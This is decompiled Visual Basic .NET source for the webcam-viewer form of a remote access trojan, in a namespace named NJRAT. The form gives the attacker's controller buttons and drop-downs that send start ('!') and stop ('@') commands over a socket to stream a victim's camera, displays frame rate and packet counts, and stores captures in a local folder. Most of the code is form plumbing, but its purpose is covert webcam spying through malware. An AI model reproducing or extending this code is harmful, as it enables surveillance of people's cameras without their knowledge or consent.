Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000D RID: 13
	<DesignerGenerated()>
	Public Partial Class Cam
		Inherits Form

		' Token: 0x060000F4 RID: 244 RVA: 0x0014EC84 File Offset: 0x0014D084
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Cam.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Cam.__ENCList.Count = Cam.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Cam.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Cam.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Cam.__ENCList(num) = Cam.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Cam.__ENCList.RemoveRange(num, Cam.__ENCList.Count - num)
					Cam.__ENCList.Capacity = Cam.__ENCList.Count
				End If
				Cam.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700005F RID: 95
		' (get) Token: 0x060000F7 RID: 247 RVA: 0x0014F424 File Offset: 0x0014D824
		' (set) Token: 0x060000F8 RID: 248 RVA: 0x0014F43C File Offset: 0x0014D83C
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x17000060 RID: 96
		' (get) Token: 0x060000F9 RID: 249 RVA: 0x0014F448 File Offset: 0x0014D848
		' (set) Token: 0x060000FA RID: 250 RVA: 0x0014F460 File Offset: 0x0014D860
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox1_SelectedIndexChanged
				Dim flag As Boolean = Me._ComboBox1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ComboBox1.SelectedIndexChanged, value2
				End If
				Me._ComboBox1 = value
				flag = (Me._ComboBox1 IsNot Nothing)
				If flag Then
					AddHandler Me._ComboBox1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000061 RID: 97
		' (get) Token: 0x060000FB RID: 251 RVA: 0x0014F4C0 File Offset: 0x0014D8C0
		' (set) Token: 0x060000FC RID: 252 RVA: 0x0014F4D8 File Offset: 0x0014D8D8
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				Dim flag As Boolean = Me._CheckBox3 IsNot Nothing
				If flag Then
					RemoveHandler Me._CheckBox3.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				flag = (Me._CheckBox3 IsNot Nothing)
				If flag Then
					AddHandler Me._CheckBox3.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000062 RID: 98
		' (get) Token: 0x060000FD RID: 253 RVA: 0x0014F538 File Offset: 0x0014D938
		' (set) Token: 0x060000FE RID: 254 RVA: 0x0014F550 File Offset: 0x0014D950
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000063 RID: 99
		' (get) Token: 0x060000FF RID: 255 RVA: 0x0014F5B0 File Offset: 0x0014D9B0
		' (set) Token: 0x06000100 RID: 256 RVA: 0x0014F5C8 File Offset: 0x0014D9C8
		Friend Overridable Property ComboBox2 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim value2 As EventHandler = AddressOf Me.ComboBox2_SelectedIndexChanged
				Dim flag As Boolean = Me._ComboBox2 IsNot Nothing
				If flag Then
					RemoveHandler Me._ComboBox2.SelectedIndexChanged, value2
				End If
				Me._ComboBox2 = value
				flag = (Me._ComboBox2 IsNot Nothing)
				If flag Then
					AddHandler Me._ComboBox2.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000064 RID: 100
		' (get) Token: 0x06000101 RID: 257 RVA: 0x0014F628 File Offset: 0x0014DA28
		' (set) Token: 0x06000102 RID: 258 RVA: 0x0014F640 File Offset: 0x0014DA40
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As PaintEventHandler = AddressOf Me.PictureBox1_Paint
				Dim flag As Boolean = Me._PictureBox1 IsNot Nothing
				If flag Then
					RemoveHandler Me._PictureBox1.Paint, value2
				End If
				Me._PictureBox1 = value
				flag = (Me._PictureBox1 IsNot Nothing)
				If flag Then
					AddHandler Me._PictureBox1.Paint, value2
				End If
			End Set
		End Property

		' Token: 0x17000065 RID: 101
		' (get) Token: 0x06000103 RID: 259 RVA: 0x0014F6A0 File Offset: 0x0014DAA0
		' (set) Token: 0x06000104 RID: 260 RVA: 0x0014F6B8 File Offset: 0x0014DAB8
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x17000066 RID: 102
		' (get) Token: 0x06000105 RID: 261 RVA: 0x0014F6C4 File Offset: 0x0014DAC4
		' (set) Token: 0x06000106 RID: 262 RVA: 0x0014F6DC File Offset: 0x0014DADC
		Friend Overridable Property vmethod_6 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim flag As Boolean = Me._vmethod_6 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_6.Tick, value2
				End If
				Me._vmethod_6 = value
				flag = (Me._vmethod_6 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_6.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000067 RID: 103
		' (get) Token: 0x06000107 RID: 263 RVA: 0x0014F73C File Offset: 0x0014DB3C
		' (set) Token: 0x06000108 RID: 264 RVA: 0x0014F754 File Offset: 0x0014DB54
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick_1
				Dim flag As Boolean = Me._Timer1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				flag = (Me._Timer1 IsNot Nothing)
				If flag Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x06000109 RID: 265 RVA: 0x0014F7B4 File Offset: 0x0014DBB4
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Cam_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Cam_Load
			Cam.__ENCAddToList(Me)
			Me.fps = 0
			Me.int_0 = 0
			Me.QQ = String.Empty
			Me.folder = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600010A RID: 266 RVA: 0x0014F824 File Offset: 0x0014DC24
		Private Sub Cam_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Dim cn As Boolean = Me.sk.CN
				If cn Then
					Me.sk.Send("@")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600010B RID: 267 RVA: 0x0014F884 File Offset: 0x0014DC84
		Private Sub Cam_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Me.QQ
				Me.ComboBox2.SelectedIndex = 3
				Me.vmethod_6.Enabled = True
				Me.folder = Me.osk.Folder + "Cam\"
				Dim flag As Boolean = Not Directory.Exists(Me.folder)
				If flag Then
					Directory.CreateDirectory(Me.folder)
				End If
				Try
					Me.ComboBox2.SelectedIndex = Class7.class8_0.int_0
				Catch ex As Exception
					Me.ComboBox2.SelectedIndex = 3
				End Try
				flag = Class7.class8_0.bool_7
				If flag Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				End If
			Catch ex2 As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x0600010C RID: 268 RVA: 0x0014FA24 File Offset: 0x0014DE24
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.vmethod_6.Enabled = False
			Dim flag As Boolean
			Try
				flag = (Me.osk Is Nothing Or Me.sk Is Nothing)
				If flag Then
					Me.Close()
					Return
				End If
				flag = (Not Me.osk.CN Or Not Me.sk.CN)
				If flag Then
					Me.Close()
				End If
			Catch ex As Exception
			End Try
			Me.int_0 = Me.fps
			flag = (Me.int_0 = 0)
			If flag Then
				Me.pkt = 0
				Me.PictureBox1.Invalidate()
			End If
			Me.fps = 0
			Me.vmethod_6.Enabled = True
		End Sub

		' Token: 0x0600010D RID: 269 RVA: 0x0014FAF0 File Offset: 0x0014DEF0
		Private Sub PictureBox1_Paint(sender As Object, e As PaintEventArgs)
			Try
				Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(CLng(Me.pkt))
				Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(Brushes.Black, rect)
				Dim brush As Brush = Brushes.Red
				Dim flag As Boolean = Me.int_0 > 3
				If flag Then
					brush = Brushes.YellowGreen
				End If
				flag = (Me.int_0 > 6)
				If flag Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600010E RID: 270 RVA: 0x0014FBD8 File Offset: 0x0014DFD8
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
				If flag Then
					Me.Button1.Text = "Stop"
					Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Conversions.ToString(Me.ComboBox1.SelectedIndex), Class7.string_1, Me.ComboBox2.Text }))
				Else
					Me.Button1.Text = "Start"
					Me.sk.Send("@")
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600010F RID: 271 RVA: 0x0014FCB8 File Offset: 0x0014E0B8
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.CheckBox3.Checked
			If checked Then
				Try
					Process.Start(Me.folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000110 RID: 272 RVA: 0x0014FD08 File Offset: 0x0014E108
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x06000111 RID: 273 RVA: 0x0014FD98 File Offset: 0x0014E198
		Private Sub ComboBox2_SelectedIndexChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("!" + Class7.string_1 + Conversions.ToString(Me.ComboBox1.SelectedIndex) + Class7.string_1, RuntimeHelpers.GetObjectValue(Me.ComboBox2.SelectedItem))) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x06000112 RID: 274 RVA: 0x0014FE28 File Offset: 0x0014E228
		Private Sub Timer1_Tick_1(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x04000070 RID: 112
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000072 RID: 114
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x04000073 RID: 115
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000074 RID: 116
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x04000075 RID: 117
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000076 RID: 118
		<AccessedThroughProperty("ComboBox2")>
		Private _ComboBox2 As ComboBox

		' Token: 0x04000077 RID: 119
		<AccessedThroughProperty("PictureBox1")>
		Private _PictureBox1 As PictureBox

		' Token: 0x04000078 RID: 120
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000079 RID: 121
		<AccessedThroughProperty("vmethod_6")>
		Private _vmethod_6 As Timer

		' Token: 0x0400007A RID: 122
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x0400007B RID: 123
		Public folder As String

		' Token: 0x0400007C RID: 124
		Public fps As Integer

		' Token: 0x0400007D RID: 125
		Private int_0 As Integer

		' Token: 0x0400007E RID: 126
		Public osk As Client

		' Token: 0x0400007F RID: 127
		Public pkt As Integer

		' Token: 0x04000080 RID: 128
		Public QQ As String

		' Token: 0x04000081 RID: 129
		Public sk As Client
	End Class
End Namespace
